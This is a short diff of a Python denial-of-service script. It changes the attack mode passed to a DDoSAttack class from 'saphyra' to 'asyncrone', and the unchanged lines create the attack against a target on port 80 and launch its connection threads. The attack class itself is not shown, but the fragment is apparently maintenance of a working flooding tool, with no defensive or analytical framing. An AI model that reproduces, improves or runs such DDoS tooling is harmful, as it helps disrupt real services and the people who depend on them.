@@ -104,6 +104,6 @@ target_port = 80
 num_connections = 1
 
 # Create and launch attack
-attack = DDoSAttack(target_url, target_port, num_connections, "saphyra")
+attack = DDoSAttack(target_url, target_port, num_connections, "asyncrone")
 attack.create_connection()
 attack.wait_for_threads()
